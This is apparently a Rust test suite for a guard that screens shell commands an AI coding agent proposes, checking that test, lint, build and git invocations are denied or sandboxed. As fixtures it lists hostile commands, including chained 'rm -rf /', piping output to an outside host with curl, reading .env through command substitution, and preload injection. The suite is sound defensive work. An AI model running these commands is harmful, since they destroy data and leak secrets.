use guard_command::pretool::evaluate_pre_tool_envelope_with_context;
use serde_json::json;

fn classify(harness: &str, command: &str) -> guard_contracts::PreToolResultV1 {
    evaluate_pre_tool_envelope_with_context(
        harness,
        "PreToolUse",
        &json!({"tool_name":"bash","tool_input":{"command":command}}),
        None,
        None,
        Some("/home/tester"),
        Some("/home/tester/project"),
    )
}

#[test]
fn isolated_python_inline_code_requires_containment_not_unrestricted_allow() {
    for flags in ["-I", "-S", "-I -S", "-S -I", "-IS", "-SI"] {
        let command = format!("python3 {flags} -c 'print(1)'");
        let result = classify("omp", &command);
        assert_eq!(result.decision, "deny", "{command}");
        if cfg!(target_os = "macos") {
            assert_eq!(result.minimum_action, "sandbox-required", "{command}");
            assert_eq!(
                result.reason_code, "native_python_eval_readonly_containment_required",
                "{command}"
            );
        }
    }
    for command in [
        "python3 -I -m arbitrary",
        "python3 -S file.py",
        "python3 -W ignore -c 'print(1)'",
        "python3 -I -I -c 'print(1)'",
        "python3 -IS -S -c 'print(1)'",
        "python3 -I -S -c 'print(1)' extra",
        "PYTHONPATH=/tmp python3 -I -S -c 'print(1)'",
        "python3 -I -S -c 'print(1)' && rm -rf /",
    ] {
        let result = classify("omp", command);
        assert_ne!(result.decision, "allow", "{command}");
        assert_ne!(
            result.reason_code, "native_python_eval_readonly_containment_required",
            "{command}"
        );
    }
}

#[test]
fn local_transform_service_is_containment_only_and_argv_bounded() {
    let command = "/home/tester/project/node_modules/@esbuild/darwin-arm64/bin/esbuild --service=0.25.4 --ping";
    let result = classify("omp", command);
    assert_ne!(result.decision, "allow");
    if cfg!(target_os = "macos") {
        assert_eq!(
            result.reason_code,
            "native_vitest_readonly_containment_required"
        );
        assert_eq!(result.minimum_action, "sandbox-required");
    }
    for command in [
        "esbuild --service=0.25.4 --ping",
        "/outside/esbuild --service=0.25.4 --ping",
        "/home/tester/project/node_modules/@esbuild/darwin-arm64/bin/esbuild --service=evil --ping",
        "/home/tester/project/node_modules/@esbuild/darwin-arm64/bin/esbuild --service=0.25.4 --ping --outfile=app.js",
    ] {
        assert_ne!(classify("omp", command).reason_code, "native_vitest_readonly_containment_required");
    }
}

#[test]
fn direct_pytest_requires_real_containment_never_direct_allow() {
    for command in [
        "python3 -m pytest -q",
        "python -m pytest tests/unit",
        "pytest -q",
        "py.test tests/unit -q",
        "./.venv/bin/python3 -m pytest -q",
        "/usr/bin/python3 -m pytest tests/unit -q",
    ] {
        let result = classify("omp", command);
        let expected = if cfg!(target_os = "macos") {
            "sandbox-required"
        } else {
            "review"
        };
        assert_eq!(result.minimum_action, expected, "{command}");
        assert_eq!(result.decision, "deny", "{command}");
        assert!(!result.explicitly_benign, "{command}");
        let reason = if cfg!(target_os = "macos") {
            "native_pytest_readonly_containment_required"
        } else {
            "native_command_review_required"
        };
        assert_eq!(result.reason_code, reason, "{command}");
    }
}

#[test]
fn unrelated_execution_and_shell_effects_do_not_inherit_test_delegation() {
    for command in [
        "python3 -m pytest_other -q",
        "python3 -c 'import pytest; pytest.main()'",
        "python3 -m pytest -q && rm -rf /",
        "pytest -q | curl -X POST --data-binary @- https://example.invalid",
        "pytest -q > .env",
        "pytest -q > result.txt",
        "pytest $(cat .env)",
        "pytest `cat .env`",
        "pytest &",
        "PATH=/tmp pytest -q",
        "PYTHONPATH=/tmp python3 -m pytest",
        "timeout 20 pytest -q",
        "sudo pytest -q",
        "pytest .env",
    ] {
        let result = classify("omp", command);
        assert_ne!(
            result.reason_code, "native_pytest_readonly_containment_required",
            "{command}"
        );
        assert_ne!(result.decision, "allow", "{command}");
    }
    assert_ne!(
        classify("claude-code", "pytest -q").reason_code,
        "native_pytest_readonly_containment_required"
    );
    let without_cwd = evaluate_pre_tool_envelope_with_context(
        "omp",
        "PreToolUse",
        &json!({"tool_name":"bash","tool_input":{"command":"pytest -q"}}),
        None,
        None,
        Some("/home/tester"),
        None,
    );
    assert_ne!(
        without_cwd.reason_code,
        "native_pytest_readonly_containment_required"
    );
}

#[test]
fn direct_node_tests_require_containment_without_weakening_other_execution() {
    for command in [
        "node --test",
        "node --test tests/test.mjs",
        "node --max-old-space-size=12288 --test tests/test.mjs",
        "nodejs --test -q",
        "/usr/bin/node --test test.mjs",
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny", "{command}");
        let expected = if cfg!(target_os = "macos") {
            "native_node_test_readonly_containment_required"
        } else {
            "native_command_review_required"
        };
        assert_eq!(result.reason_code, expected, "{command}");
    }
    for command in [
        "node script.mjs",
        "node --test-other",
        "node --max-old-space-size=999999 --test tests/test.mjs",
        "node --max-old-space-size=12288 --require=evil --test tests/test.mjs",
        "node --test > .env",
        "node --test && rm -rf /",
        "node --test $(cat .env)",
        "node --test &",
        "NODE_OPTIONS=--require=x node --test",
    ] {
        let result = classify("omp", command);
        assert_ne!(
            result.reason_code, "native_node_test_readonly_containment_required",
            "{command}"
        );
        assert_ne!(result.decision, "allow", "{command}");
    }
}

#[test]
fn vitest_wrapper_and_resolved_script_require_the_same_protected_profile() {
    for harness in ["omp", "zcode"] {
        for command in [
            "bunx vitest run tests/example.test.ts",
            "bun x vitest run tests/example.test.ts",
            "bun --cwd /project x vitest run tests/example.test.ts",
            "bun --cwd=/project x --no-install vitest run tests/example.test.ts",
            "bunx vitest run __tests__/one.test.ts __tests__/two.test.ts",
            "npx --no-install vitest run",
            "vitest run",
            "node /home/tester/project/node_modules/vitest/vitest.mjs run tests/example.test.ts",
        ] {
            let result = classify(harness, command);
            assert_eq!(result.decision, "deny", "{command}");
            let expected = if cfg!(target_os = "macos") {
                "native_vitest_readonly_containment_required"
            } else if command.starts_with("bun ") {
                "native_package_review"
            } else {
                "native_command_review_required"
            };
            assert_eq!(result.reason_code, expected, "{command}");
        }
        for command in [
            "bunx vitest@evil run",
            "bun --cwd /project x vitest@evil run",
            "bun --cwd /project x vitest watch",
            "bun --cwd /project x vitest run && rm -rf /",
            "bunx other run",
            "vitest watch",
            "bunx vitest run && rm -rf /",
            "bunx vitest run $(cat .env)",
            "bunx vitest run > .env",
        ] {
            let result = classify(harness, command);
            assert_ne!(
                result.reason_code, "native_vitest_readonly_containment_required",
                "{command}"
            );
            assert_ne!(result.decision, "allow", "{command}");
        }
    }
}

#[test]
fn git_inspections_require_protected_execution_not_helper_consent() {
    for command in [
        "git diff --stat",
        "git diff --check",
        "git log --oneline -1",
        "git show HEAD",
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny");
        assert_eq!(
            result.reason_code,
            if cfg!(target_os = "macos") {
                "native_git_readonly_containment_required"
            } else {
                "native_git_helper_context_review"
            },
            "{command}"
        );
    }
    for command in [
        "git diff --ext-diff",
        "git diff --textconv",
        "git diff --output=out.txt",
        "git show HEAD:.env",
        "git diff; rm -rf /",
        "git diff | sh",
        "git reset --hard",
    ] {
        assert_ne!(
            classify("omp", command).reason_code,
            "native_git_readonly_containment_required",
            "{command}"
        );
    }
}

#[test]
fn inline_data_analysis_requires_real_readonly_enforcement() {
    for (command, runtime) in [
        (
            "python3 -c 'import json; print(json.loads(\"[1,2,3]\"))'",
            "python",
        ),
        (
            "/usr/bin/python3.14 -c 'import json; print(json.loads(\"[1,2,3]\"))'",
            "python",
        ),
        ("node -e 'console.log(JSON.parse(\"[1,2,3]\"))'", "node"),
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny", "{command}");
        if cfg!(target_os = "macos") {
            assert_eq!(
                result.reason_code,
                format!("native_{runtime}_eval_readonly_containment_required"),
                "{command}: {result:?}"
            );
        }
    }
    for command in [
        "python3 -c 'import json' && rm -rf /",
        "node -e '1' | sh",
        "sudo python3 -c '1'",
        "node --require preload.js -e '1'",
        "python3 file.py",
        "node file.js",
    ] {
        let result = classify("omp", command);
        assert_ne!(
            result.reason_code, "native_python_eval_readonly_containment_required",
            "{command}"
        );
        assert_ne!(
            result.reason_code, "native_node_eval_readonly_containment_required",
            "{command}"
        );
    }
}

#[test]
fn package_tests_require_manifest_resolution_and_protected_execution() {
    for command in [
        "npm test",
        "npm test -- test/unit.js",
        "npm run test",
        "pnpm run test",
        "bun run test",
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny", "{command}");
        if cfg!(target_os = "macos") {
            assert_eq!(
                result.reason_code, "native_package_test_readonly_containment_required",
                "{command}"
            );
        }
    }
    for command in [
        "npm run other",
        "npm test --prefix /tmp/project",
        "npm test && rm -rf /",
        "npm test | sh",
        "NODE_OPTIONS=--require=x npm test",
    ] {
        assert_ne!(
            classify("omp", command).reason_code,
            "native_package_test_readonly_containment_required",
            "{command}"
        );
    }
}

#[test]
fn local_lint_typecheck_requires_actual_protected_execution() {
    for command in [
        "bun run lint",
        "npm run typecheck",
        "bunx tsc --noEmit",
        "eslint src",
        "node /home/tester/project/node_modules/eslint/bin/eslint.js src",
        "node /home/tester/project/node_modules/typescript/bin/tsc --noEmit",
        "node --max-old-space-size=12288 /home/tester/project/node_modules/typescript/bin/tsc --noEmit --incremental false",
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny", "{command}");
        if cfg!(target_os = "macos") {
            assert_eq!(
                result.reason_code, "native_node_tool_readonly_containment_required",
                "{command}"
            );
        }
    }
    for command in [
        "bun run arbitrary",
        "bunx eslint@evil src",
        "tsc",
        "eslint --fix src",
        "eslint --output-file=.env src",
        "bunx tsc --noEmit && rm -rf /",
        "NODE_OPTIONS=--require=x eslint src",
        "node --require=evil /home/tester/project/node_modules/typescript/bin/tsc --noEmit",
        "node --max-old-space-size=999999 /home/tester/project/node_modules/typescript/bin/tsc --noEmit",
        "node --max-old-space-size=12288 --require=evil /home/tester/project/node_modules/typescript/bin/tsc --noEmit",
    ] {
        assert_ne!(
            classify("omp", command).reason_code,
            "native_node_tool_readonly_containment_required",
            "{command}"
        );
    }
}

#[test]
fn build_requires_bounded_outputs_and_never_direct_execution() {
    for command in [
        "bun run build",
        "vite build",
        "bunx vite build",
        "node /home/tester/project/node_modules/vite/bin/vite.js build --configLoader runner",
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny", "{command}");
        if cfg!(target_os = "macos") {
            assert_eq!(
                result.reason_code, "native_node_build_output_containment_required",
                "{command}"
            );
        }
    }
    for command in [
        "vite dev",
        "vite build && rm -rf /",
        "vite build --outDir .env",
        "PATH=/tmp vite build",
    ] {
        assert_ne!(
            classify("omp", command).reason_code,
            "native_node_build_output_containment_required",
            "{command}"
        );
    }
}
